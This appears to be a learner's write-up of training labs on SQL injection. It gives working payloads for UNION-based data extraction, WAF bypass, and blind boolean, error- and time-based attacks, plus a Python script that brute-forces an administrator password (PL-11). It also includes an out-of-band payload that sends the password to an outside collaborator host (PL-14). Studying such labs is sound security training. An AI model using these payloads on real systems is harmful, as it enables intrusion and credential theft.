# My SQLi Lab Notes

## PL-1
### Lab: SQL injection with filter bypass via XML encoding

There is a WAF protecting the server from basic SQLi.

I used this command in Hackvertor to convert the payload into hex entities to make it undetectable by the WAF:

```xml
<@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities>
```

---

## PL-2
### Lab: SQL injection attack, querying the database type and version on Oracle

The lab mentioned that there is a SQL injection in the category parameter, so I used SQLi in the GET filter within the Gifts section.

```http
GET /filter?category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2
```

---

## PL-3
### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Similar to the previous lab, the SQL injection exists in the category parameter.

```http
GET /filter?category=Corporate+gifts'+UNION+SELECT+@@version,+NULL# HTTP/2
```

---

## PL-4
### Lab: SQL injection attack, listing the database contents on non-Oracle databases

In the same category request, I used the following query to enumerate tables:

```http
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

From the results, I found a table named `users_lpxeav`.

To identify column names:

```http
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

This revealed the username and password columns.

To extract credentials:

```http
'+UNION+SELECT+username_dfqphv,+password_qojfbx+FROM+users_lpxeav--
```

---

## PL-5
### Lab: SQL injection attack, listing the database contents on Oracle

Oracle uses different metadata tables.

List tables:

```http
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

List columns:

```http
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

Extract credentials:

```http
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

Example values discovered:

- USERNAME_HDXSLX
- PASSWORD_EMVRSN
- USERS_OQDRQH

Final payload:

```http
Gifts'+UNION+SELECT+USERNAME_HDXSLX,+PASSWORD_EMVRSN+FROM+USERS_OQDRQH--
```

---

## PL-6
### Lab: SQL injection UNION attack, determining the number of columns returned by the query

The SQL injection exists in the product category parameter.

Start with:

```http
'+UNION+SELECT+NULL--
```

Increase the number of NULL values until the query succeeds:

```http
'+UNION+SELECT+NULL,NULL,NULL--
```

This showed that the query returns **3 columns**.

Alternative method:

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

For Oracle:

```sql
' UNION SELECT NULL FROM DUAL--
```

Since Oracle requires a table reference, `DUAL` is used.

---

## PL-7
### Lab: SQL injection UNION attack, finding a column containing text

Using the previous lab's technique, I found that the query returns **3 columns**.

I then tested which columns accept text values.

```http
'+UNION+SELECT+NULL,'oIjIRU',NULL--
```

The second column accepted text input.

---

## PL-8
### Lab: SQL injection UNION attack, retrieving data from other tables

First, determine the number of columns.

Then verify which columns support text:

```http
'+UNION+SELECT+'abc','def'--
```

Finally, extract credentials:

```http
'+UNION+SELECT+username,password+FROM+users--
```

---

## PL-9
### Lab: SQL injection UNION attack, retrieving multiple values in a single column

After determining that only the second column supports text, I combined multiple values into one column.

```http
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

---

## PL-10
### Lab: Blind SQL injection with conditional responses

I used Burp Suite Repeater and Intruder (Sniper attack).

The application displayed **"Welcome back"** when the condition evaluated to true.

Example payload:

```http
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

I iterated through characters until the correct password was discovered.

---

## PL-11
### Lab: Blind SQL injection with conditional errors

I automated the attack using Python and monitored HTTP 200 and HTTP 500 responses.

**Note:** The TrackingId value itself was not important. Random values still worked.

Example script:

```python
import requests
import string

url = "TARGET_URL"
tracking = "PUT_TRACKING_ID_HERE"
session = "PUT_SESSION_COOKIE_HERE"

chars = string.ascii_lowercase + string.digits
password = ""

for pos in range(1, 21):
    found = False

    for ch in chars:
        payload = (
            tracking
            + "'||(SELECT CASE WHEN SUBSTR(password,"
            + str(pos)
            + ",1)='"
            + ch
            + "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        )

        cookies = {
            "TrackingId": payload,
            "session": session
        }

        try:
            r = requests.get(url, cookies=cookies, timeout=10)

            if r.status_code == 500:
                password += ch
                print(f"Found: {ch}")
                found = True
                break

        except requests.exceptions.RequestException as e:
            print(e)

    if not found:
        break

print(password)
```

---

## PL-12
### Lab: Blind SQL injection with time delays

The goal was to cause a delay in the application's response.

I injected a delay function through the vulnerable cookie parameter and verified that the response time increased.

---

## PL-13
### Lab: Blind SQL injection with time delays and information retrieval

Since there was no visible output or error message, I used time-based blind SQL injection.

Verify delay:

```http
TrackingId=x'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Extract password characters:

```http
TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

If the guessed character was correct, the response was delayed.

I automated the extraction using Python on Kali Linux.

---

## PL-14
### Lab: Blind SQL injection with out-of-band data exfiltration

Traditional blind SQLi techniques did not work because there were no response, error, or timing differences.

I used Burp Collaborator for out-of-band (OAST) exfiltration.

Example payload:

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABDOMAIN/"> %remote;]>'),'/l')+FROM+dual--
```

This triggered a DNS/HTTP request to Burp Collaborator containing the extracted value.

Example Collaborator interaction:

```text
5wx2e9jg2jhhx78f2iyh.uwuejmplymw5r0g1rmtr8sfgh7nybozd.oastify.com
```
